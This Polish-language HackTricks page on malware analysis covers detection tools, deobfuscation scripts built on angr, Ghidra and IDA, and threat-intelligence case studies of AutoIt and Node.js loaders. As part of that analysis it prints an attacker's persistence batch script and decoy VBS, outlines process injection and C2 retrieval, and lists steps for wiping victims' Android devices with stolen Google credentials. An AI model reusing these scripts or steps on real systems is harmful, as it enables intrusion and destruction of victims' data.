# Malware Analysis

{{#include ../../banners/hacktricks-training.md}}

## Forensics CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Usługi online

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Narzędzia antywirusowe i detekcyjne (offline)

### Yara

#### Instalacja
```bash
sudo apt-get install -y yara
```
#### Przygotuj reguły

Użyj tego skryptu, aby pobrać i scalić wszystkie yara malware rules z github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Utwórz katalog _**rules**_ i uruchom skrypt. Spowoduje to utworzenie pliku _**malware_rules.yar**_, który zawiera wszystkie yara rules dla malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Skan
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Wykrywanie malware i tworzenie yara rules

Możesz użyć narzędzia [**YaraGen**](https://github.com/Neo23x0/yarGen) do generowania yara rules z pliku binarnego. Zobacz te samouczki: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalacja
```
sudo apt-get install -y clamav
```
#### Skanowanie
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** wykrywa potencjalnie złośliwe **capabilities** w plikach wykonywalnych: PE, ELF, .NET. Dzięki temu znajdzie rzeczy takie jak Att\&ck tactics, lub podejrzane capabilities takie jak:

- check for OutputDebugString error
- run as a service
- create process

Pobierz go z [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC oznacza Indicator Of Compromise. IOC to zestaw **warunków, które identyfikują** potencjalnie niepożądane oprogramowanie lub potwierdzone **malware**. Blue Teams używają takiej definicji do **wyszukiwania tego typu złośliwych plików** w swoich **systemach** i **sieciach**.\  
Udostępnianie tych definicji jest bardzo przydatne, ponieważ gdy malware zostanie zidentyfikowane na komputerze i zostanie utworzony IOC dla tego malware, inne Blue Teams mogą go użyć, aby szybciej zidentyfikować malware.

Narzędzie do tworzenia lub modyfikowania IOC to [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html).\
Możesz użyć narzędzi takich jak [**Redline**](https://www.fireeye.com/services/freeware/redline.html) do **wyszukiwania zdefiniowanych IOC na urządzeniu**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) jest skanerem dla Simple Indicators of Compromise.\
Detekcja opiera się na czterech metodach detekcji:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) jest skanerem malware dla Linuxa wydanym na licencji GNU GPLv2, zaprojektowanym z myślą o zagrożeniach występujących w środowiskach współdzielonego hostingu. Wykorzystuje dane o zagrożeniach pochodzące z systemów wykrywania włamań na krawędzi sieci do wyodrębniania malware, które jest aktywnie wykorzystywane w atakach, oraz generowania sygnatur do wykrywania. Dodatkowo dane o zagrożeniach pochodzą również ze zgłoszeń użytkowników przy użyciu funkcji LMD checkout oraz z zasobów społeczności malware.

### rkhunter

Narzędzia takie jak [**rkhunter**](http://rkhunter.sourceforge.net) mogą być użyte do sprawdzenia systemu plików pod kątem możliwych **rootkits** i malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) jest narzędziem, które spróbuje znaleźć obfuscated strings w executables, używając różnych technik.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) sprawdza kilka podstawowych rzeczy w executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) to narzędzie pozwalające uzyskać informacje o Windows executables, takie jak imports, exports, headers, ale także sprawdzi virus total i znajdzie potencjalne Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) to narzędzie do wykrywania, czy plik jest **encrypted** i także znajdzie **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) jest skryptem Python, który używa różnych **statistical methods** do wykrywania **obfuscated** i **encrypted** treści w plikach tekstowych/skryptowych. Przeznaczeniem NeoPI jest wspomaganie **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) robi, co w jego mocy, aby wykryć **obfuscated**/**dodgy code**, jak również pliki używające funkcji **PHP** często stosowanych w **malwares**/webshells.

### Apple Binary Signatures

Podczas sprawdzania jakiegoś **malware sample** zawsze powinieneś **check the signature** binarki, ponieważ **developer**, który ją podpisał, może być już **related** z **malware**.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Techniki wykrywania

### File Stacking

Jeśli wiesz, że jakiś folder zawierający **pliki** na **web server** został **ostatnio zaktualizowany w określonym dniu**, **sprawdź** **daty** utworzenia i modyfikacji wszystkich **plików** na **web server** i jeśli jakaś data jest **podejrzana**, sprawdź ten plik.

### Baselines

Jeżeli **pliki** w folderze **nie powinny były być modyfikowane**, możesz obliczyć **hash** **oryginalnych plików** folderu i **porównać** je z **bieżącymi**. Wszystko, co zostało zmodyfikowane, będzie **podejrzane**.

### Statistical Analysis

Gdy informacje są zapisywane w logach, możesz **sprawdzić statystyki**, np. ile razy każdy plik na **web server** był dostępny — web shell może być jednym z najczęściej wywoływanych.

---

### Android in-app native telemetry (no root)

Na Androidzie możesz instrumentować kod natywny wewnątrz procesu docelowej aplikacji przez wstępne załadowanie małej biblioteki loggera przed inicjalizacją innych bibliotek JNI. Daje to wczesny wgląd w zachowanie native bez hooków systemowych lub root. Popularne podejście to SoTap: wrzuć libsotap.so dla właściwego ABI do APK i wstrzyknij wywołanie System.loadLibrary("sotap") wcześnie (np. w statycznym inicjalizatorze lub Application.onCreate), a następnie zbieraj logi z internal/external ścieżek lub przez fallback do Logcat.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Niektóre Android malware i aplikacje chronione RASP ukrywają nazwy metod JNI i sygnatury przez dekodowanie ich w czasie wykonania przed wywołaniem RegisterNatives. Gdy instrumentacja Frida/ptrace jest zabijana przez anti-debug, nadal możesz odzyskać plaintext offline, uruchamiając dekoder zawarty w binarce za pomocą angr, a następnie wprowadzając wyniki z powrotem do Ghidra jako komentarze.

Kluczowy pomysł: traktuj dekoder wewnątrz .so jako wywoływalną funkcję, wykonaj go na zniekształconych blokach bajtów w .rodata i skonkretyzuj bajty wyjściowe aż do pierwszego \x00 (terminatora łańcucha C). Upewnij się, że angr i Ghidra używają tej samej image base, aby uniknąć niezgodności adresów.

Przegląd workflow
- Wstępna analiza w Ghidra: zidentyfikuj dekoder oraz jego calling convention/arguments w JNI_OnLoad i konfiguracji RegisterNatives.
- Uruchom angr (CPython3), aby wykonać dekoder dla każdego docelowego stringa i zrzucić wyniki.
- Anotuj w Ghidra: automatycznie komentuj odszyfrowane stringi przy każdym miejscu wywołania, żeby przyspieszyć rekonstrukcję JNI.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>Konfiguracja angr i wykonanie dekodera offline</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Na dużą skalę zbuduj statyczną mapę call sites do argumentów dekodera (encoded_ptr, size). Wrappery mogą ukrywać argumenty, więc możesz utworzyć to mapowanie ręcznie z Ghidra xrefs, jeśli odzyskiwanie API jest noisy.

<details>
<summary>Wsadowe dekodowanie wielu call sites z użyciem angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Oznacz call sites w Ghidra
Opcja A: Jython-only comment writer (użyj wstępnie wygenerowanego JSON)
- Ponieważ angr wymaga CPython3, rozdziel deobfuskację i adnotację. Najpierw uruchom powyższy skrypt angr, aby wygenerować decoded_strings.json. Następnie uruchom ten Jython GhidraScript, aby zapisać PRE_COMMENTs w każdym call site (i dołączyć nazwę funkcji wywołującej dla kontekstu):

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opcja B: Pojedynczy skrypt CPython via pyhidra/ghidra_bridge
- Alternatywnie użyj pyhidra lub ghidra_bridge do sterowania API Ghidra z tego samego procesu CPython, w którym działa angr. Pozwala to wywołać decode_string() i od razu ustawić PRE_COMMENTs bez pliku pośredniego. Logika odzwierciedla skrypt Jython: zbuduj mapę callsite→function za pomocą ReferenceManager, zdekoduj przy użyciu angr i ustaw komentarze.

Dlaczego to działa i kiedy tego używać
- Wykonanie offline omija RASP/anti-debug: nie wymaga ptrace ani hooków Frida do odzyskania ciągów.
- Utrzymanie zgodnych base_addr w Ghidra i angr (np. 0x00100000) zapewnia, że adresy funkcji/danych będą się zgadzać między narzędziami.
- Powtarzalny przepis dla decoderów: potraktuj transformację jako funkcję czystą, zaalokuj bufor wyjściowy w nowym stanie, wywołaj ją z (encoded_ptr, out_ptr, len), następnie skonkretyzuj przez state.solver.eval i parsuj C-strings aż do \x00.

Uwagi i pułapki
- Szanuj docelowe ABI/konwencję wywołań. angr.factory.callable wybiera ją na podstawie arch; jeśli argumenty wyglądają przesunięte, określ cc jawnie.
- Jeśli decoder oczekuje wyzerowanych buforów wyjściowych, zainicjalizuj outbuf zerami w state przed wywołaniem.
- Dla pozycyjnie niezależnych bibliotek Android .so zawsze podaj base_addr, aby adresy w angr zgadzały się z tymi widzianymi w Ghidra.
- Użyj currentProgram.getReferenceManager() do enumeracji call-xrefs nawet jeśli aplikacja opakowuje decoder w cienkie stuby.

Dla podstaw angr zobacz: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Nowoczesne rodziny malware nadużywają obfuskacji Control-Flow Graph (CFG): zamiast bezpośredniego skoku/wywołania obliczają cel w czasie wykonania i wykonują `jmp rax` lub `call rax`. Mały *dispatcher* (zazwyczaj dziewięć instrukcji) ustawia docelowy adres w zależności od flag CPU `ZF`/`CF`, całkowicie psując statyczne odzyskiwanie CFG.

Technikę — demonstrowaną przez loader SLOW#TEMPEST — można pokonać za pomocą trzyetapowej procedury, która opiera się tylko na IDAPython i emulatorze CPU Unicorn.

### 1. Zlokalizuj każdy skok/wywołanie pośrednie
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Wyodrębnij kod bajtowy dispatchera
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emuluj to dwukrotnie za pomocą Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Uruchom `run(code,0,0)` i `run(code,1,1)`, aby uzyskać docelowe adresy gałęzi *false* i *true*.

### 4. Przywróć bezpośredni jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Po zaaplikowaniu poprawki wymuś ponowną analizę funkcji w IDA, aby przywrócić pełny CFG i wynik Hex-Rays:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Oznacz pośrednie wywołania API

Gdy znane jest rzeczywiste miejsce docelowe każdego `call rax` możesz powiedzieć IDA, czym ono jest, dzięki czemu typy parametrów i nazwy zmiennych zostaną odzyskane automatycznie:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktyczne korzyści

* Przywraca prawdziwe CFG → dekompilacja zmienia się z *10* linii na tysiące.
* Umożliwia string-cross-reference & xrefs, co sprawia, że rekonstrukcja zachowania jest trywialna.
* Skrypty są wielokrotnego użytku: upuść je do dowolnego loadera chronionego tym samym trikiem.

---

## Loadery oparte na AutoIt: .a3x decryption, Task Scheduler masquerade and RAT injection

Ten schemat włamania łączy podpisane MSI, AutoIt loaders skompilowane do .a3x oraz zadanie Task Scheduler podszywające się pod nieszkodliwą aplikację.

### MSI → custom actions → AutoIt orchestrator

Drzewo procesów i polecenia wykonywane przez custom actions MSI:

- MsiExec.exe → cmd.exe aby uruchomić install.bat
- WScript.exe aby wyświetlić pozorowane okno błędu
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (zrzuca loader, ustawia persistence, czyści się):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (przynęta dla użytkownika):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Zrzuca AutoIt3.exe i IoKlTr.au3 do C:\Users\Public\Music
- Kopiuje schtasks.exe do hwpviewer.exe (udaje przeglądarkę Hangul Word Processor)
- Tworzy zadanie zaplanowane "IoKlTr", które uruchamia się co 1 minutę
- Skrót startowy LNK widoczny jako Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Umieszcza moduły w podfolderach %APPDATA%\Google\Browser\ zawierających `adb` lub `adv` i uruchamia je za pomocą skryptów pomocniczych autoit.vbs/install.bat

Forensic triage tips:
- enumeracja schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Szukaj przemianowanych kopii schtasks.exe współistniejących z Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Typowe ścieżki: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Koreluj tworzenie procesów: AutoIt3.exe uruchamia legalne pliki binarne Windows (np. cleanmgr.exe, hncfinder.exe)

### Ładowarki AutoIt i deszyfrowanie ładunków .a3x → iniekcja

- Moduły AutoIt są kompilowane z `#AutoIt3Wrapper_Outfile_type=a3x` i odszyfrowują osadzone ładunki przed wstrzyknięciem do nieszkodliwych procesów.
- Zaobserwowane rodziny: QuasarRAT (wstrzyknięty do hncfinder.exe) oraz RftRAT/RFTServer (wstrzyknięty do cleanmgr.exe), jak również moduły RemcosRAT (`Remcos\RunBinary.a3x`).
- Schemat deszyfrowania: wyprowadzenie klucza AES za pomocą HMAC, odszyfrowanie osadzonego bloba, a następnie wstrzyknięcie jawnego modułu.

Ogólny szkielet deszyfrowania (dokładne wejście/algorytm HMAC jest specyficzne dla rodziny):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) procesu docelowego (np. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory z odszyfrowanym modułem/shellcode
- CreateRemoteThread lub QueueUserAPC do wykonania payloadu

Hunting ideas
- AutoIt3.exe uruchamiany przez MsiExec.exe lub WScript.exe, uruchamiający narzędzia systemowe
- Pliki z rozszerzeniem `.a3x` lub uruchamiacze skryptów AutoIt w ścieżkach publicznych/umożliwiających zapis przez użytkownika
- Podejrzane zadania zaplanowane uruchamiające AutoIt3.exe lub binarki niesygnowane przez Microsoft, z wyzwalaczami na poziomie minut

### Account-takeover abuse of Android Find My Device (Find Hub)

Podczas włamania na Windows operatorzy użyli skradzionych poświadczeń Google do wielokrotnego wymazania urządzeń Android ofiary, tłumiąc powiadomienia, jednocześnie rozszerzając dostęp przez zalogowany na pulpicie komunikator ofiary.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## Tracing heavily obfuscated Node.js loaders

Atakujący coraz częściej pakują JavaScript loaders wewnątrz samodzielnych binarek Windows skompilowanych za pomocą `nexe`, dzięki czemu runtime jest dołączony do skryptu. Powstały PE często waży 60–90 MB i uruchamia się nawet jeśli Node.js nie jest zainstalowany. Podczas wstępnej analizy:

- Use [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) to carve the embedded JavaScript out of the PE and feed it to local tooling for static diffing.
- Spodziewaj się mutexu opartego na dysku w `%TEMP%` (GachiLoader upuszcza losowy `<name>.lock` plik, który wygasa po ~5 minutach). Skopiowanie pliku do sandboksa przed uruchomieniem pozwala pominąć redundantne etapy, a jednocześnie zobaczyć późniejsze payloady.

### Node.js API tracing to defeat anti-analysis

Narzędzie Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) podczepia core modules wewnątrz dowolnego procesu Node.js, pozwala sfałszować anti-VM probes i zachowuje wszystkie artefakty, które sample zapisuje. Uruchamiaj zaciemnione skrypty przez tracer, aby utrzymać analitycznie kontrolowane instrumentacje w stosie wywołań:
```powershell
node -r .\tracer.js main.js
```
Key configuration toggles inside `tracer.js` allow you to:

- Log filesystem, child-process, and HTTP activity (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Every dropped file—such as `kidkadi.node`—is copied to the working directory before the malware deletes it.
- Override environment fingerprints by returning realistic RAM/CPU counts, faking `tasklist` output, and tampering with PowerShell/WMI responses. This bypasses loaders that demand ≥4 GB RAM, ≥2 cores, and scrutinize user names (`mashinesssss`, `wdagutilityaccount`, etc.), hostnames (`desktop-vrsqlag`, `server1` …), and process names (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Neuter WMI hardware checks like `Get-WmiObject Win32_DiskDrive` (looking for `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blocking “VirtualBox Graphics Adapter”, “Hyper-V Video”, etc.) and `Win32_PortConnector` counts. When those probes report “real” hardware, sandboxes no longer hit the infinite loop of benign `Invoke-WebRequest` calls to `linkedin.com`, `grok.com`, `whatsapp.com`, and similar domains that GachiLoader uses to waste analysis time.

### Automatyczne przechwytywanie ruchu gated C2

Hooki sieciowe w tracerze ujawniają wielowarstwowe uwierzytelnianie C2 bez odwracania obfuskacji JavaScript. W obserwowanej kampanii loader:

1. POSTs host telemetry to `/log` on each hard-coded C2.
2. Issues `GET /richfamily/<per-sample key>` with `X-Secret: gachifamily` to retrieve a Base64-encoded payload URL.
3. Performs a final `GET` to that URL with a long per-sample `X-Secret` header; missing it returns `403 Forbidden`.

Ponieważ tracer rejestruje kompletne żądania (nagłówki, ciała, cele), możesz odtworzyć ten sam ruch, aby pobrać payloady, zrzucić shelle Themida/VMProtect z pamięci oraz masowo wydobyć dane konfiguracyjne Rhadamanthys.

## AdaptixC2: Ekstrakcja konfiguracji i TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
